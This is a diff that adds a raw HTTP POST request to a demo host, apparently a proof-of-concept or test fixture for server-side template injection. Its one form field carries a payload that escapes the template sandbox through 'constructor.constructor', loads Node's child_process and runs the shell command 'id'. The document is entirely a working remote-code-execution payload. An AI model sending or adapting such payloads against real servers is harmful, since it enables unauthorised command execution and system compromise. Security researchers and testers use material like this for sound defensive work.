@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Connection: close
+
+s={{%0aranges.constructor.constructor("return%0aimport")()('child_process').exec('id')%0a}}
